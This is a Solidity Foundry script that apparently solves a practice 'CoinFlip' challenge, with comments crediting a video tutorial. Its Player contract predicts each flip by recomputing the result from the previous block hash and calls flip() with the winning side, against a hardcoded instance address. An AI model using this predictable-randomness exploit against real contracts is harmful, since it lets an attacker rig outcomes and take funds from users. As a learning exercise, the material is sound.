// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// From JohnnyTime => https://www.youtube.com/watch?v=02uda3XpQfg&list=PLKXasCp8iWpjYKwk0hcdVDVZlpW_NGEYS&index=4
// The logic of the Player contract needs to be in a separate contract to properly interact with the CoinFlip contract.
// Placing the logic directly in the run function does not maintain state correctly, hence the consecutiveWins variable was not updating.
// But I do not fully understand why
// And yes you have to manually cal it 10 times :)
contract Player {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinflipInstance =
        CoinFlip(0x5CEC79809cd58244809e0ccC6319542e423D5380);

    function run() external {
        vm.startBroadcast();
        new Player(coinflipInstance);
        console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
